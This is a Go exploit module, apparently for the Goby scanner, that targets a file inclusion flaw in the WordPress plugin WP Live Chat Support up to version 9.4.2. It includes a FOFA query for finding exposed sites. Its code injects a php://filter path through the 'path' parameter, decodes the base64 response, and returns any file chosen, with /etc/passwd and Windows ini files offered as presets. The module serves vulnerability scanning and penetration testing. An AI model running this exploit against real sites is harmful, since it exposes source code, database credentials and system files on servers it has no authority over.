package exploits

import (
	"encoding/base64"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "WordPress Plugin WP Live Chat Support path File Inclusion Vulnerability",
    "Description": "<p>WP Live Chat Support is a reliable and tested live chat solution for WordPress.</p><p>There is a file inclusion vulnerability in WP Live Chat Support &lt;= 9.4.2.Attackers can exploit this vulnerability to obtain sensitive files.</p>",
    "Product": "wordpress-plugin-wp-live-chat-support",
    "Homepage": "https://wordpress.org/plugins/wp-live-chat-support/",
    "DisclosureDate": "2022-04-28",
    "Author": "sunying",
    "FofaQuery": "body=\"wp-content/plugins/wp-live-chat-support\"",
    "GobyQuery": "body=\"wp-content/plugins/wp-live-chat-support\"",
    "Level": "2",
    "Impact": "<p>Attackers can use this vulnerability to read the leaked source code, database configuration files, etc., resulting in an extremely insecure website.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://wordpress.org/plugins/wp-live-chat-support/\">https://wordpress.org/plugins/wp-live-chat-support/</a></p>",
    "References": [
        "https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/wp-live-chat-support/3cx-live-chat-942-local-file-inclusion"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filePath",
            "type": "createSelect",
            "value": "custom,C:\\Windows\\php.ini,C:\\Windows\\system.ini,/etc/passwd,/etc/hosts",
            "show": ""
        },
        {
            "name": "custom",
            "type": "input",
            "value": "/etc/passwd",
            "show": "filePath=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read",
        "File Inclusion"
    ],
    "VulType": [
        "File Read",
        "File Inclusion"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.8",
    "Translation": {
        "CN": {
            "Name": "WordPress WP Live Chat Support 插件 path 文件包含漏洞",
            "Product": "wordpress-plugin-wp-live-chat-support",
            "Description": "<p>WP Live Chat Support 是一个可靠且经过测试的 WordPress 实时聊天解决方案。</p><p>WP Live Chat Support&lt;= 9.4.2版本存在文件包含漏洞，攻击者利用该漏洞可获取敏感文件。<br></p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://wordpress.org/plugins/wp-live-chat-support/\">https://wordpress.org/plugins/wp-live-chat-support/</a><br></p>",
            "Impact": "<p>攻击者可通过该漏洞读取泄露源码、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "VulType": [
                "文件读取",
                "文件包含"
            ],
            "Tags": [
                "文件读取",
                "文件包含"
            ]
        },
        "EN": {
            "Name": "WordPress Plugin WP Live Chat Support path File Inclusion Vulnerability",
            "Product": "wordpress-plugin-wp-live-chat-support",
            "Description": "<p>WP Live Chat Support is a reliable and tested live chat solution for WordPress.</p><p>There is a file inclusion vulnerability in WP Live Chat Support &lt;= 9.4.2.Attackers can exploit this vulnerability to obtain sensitive files.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://wordpress.org/plugins/wp-live-chat-support/\">https://wordpress.org/plugins/wp-live-chat-support/</a><br></p>",
            "Impact": "<p>Attackers can use this vulnerability to read the leaked source code, database configuration files, etc., resulting in an extremely insecure website.<br></p>",
            "VulType": [
                "File Read",
                "File Inclusion"
            ],
            "Tags": [
                "File Read",
                "File Inclusion"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10710"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			file_inclusion_exp := `php://filter/convert.base64-encode/resource=wp-content/plugins/wp-live-chat-support/includes/wplc_base_controller.php`
			vuln_url := fmt.Sprintf("?path=%s", file_inclusion_exp)
			cfg := httpclient.NewGetRequestConfig(vuln_url)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if response, err := httpclient.DoHttpRequest(u, cfg); err == nil && strings.Contains(response.RawBody, "id=\"wplc_wrapper\"") {
				r, _ := regexp.Compile(`<div\s*id="wplc_wrapper"\s*>\s*(.+?)\s*<\s*/div>`)
				base64_str := r.FindStringSubmatch(response.RawBody)[1]
				decoded, _ := base64.StdEncoding.DecodeString(base64_str)
				decodestr_exp := string(decoded)
				return strings.Contains(decodestr_exp, "evaluate_php_template")
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			filePath := ss.Params["filePath"].(string)
			if filePath == "custom" {
				filePath = ss.Params["custom"].(string)
			}
			file_inclusion_exp := fmt.Sprintf(`php://filter/convert.base64-encode/resource=%s`, filePath)
			vuln_url := fmt.Sprintf("?path=%s", file_inclusion_exp)
			cfg := httpclient.NewGetRequestConfig(vuln_url)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if response, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil && strings.Contains(response.RawBody, "id=\"wplc_wrapper\"") {
				r, _ := regexp.Compile(`<div\s*id="wplc_wrapper"\s*>\s*(.+?)\s*<\s*/div>`)
				base64_str := r.FindStringSubmatch(response.RawBody)[1]
				decoded, _ := base64.StdEncoding.DecodeString(base64_str)
				decodestr_exp := string(decoded)
				expResult.Success = true
				expResult.OutputType = "html"
				expResult.Output += decodestr_exp
			}

			return expResult
		},
	))
}
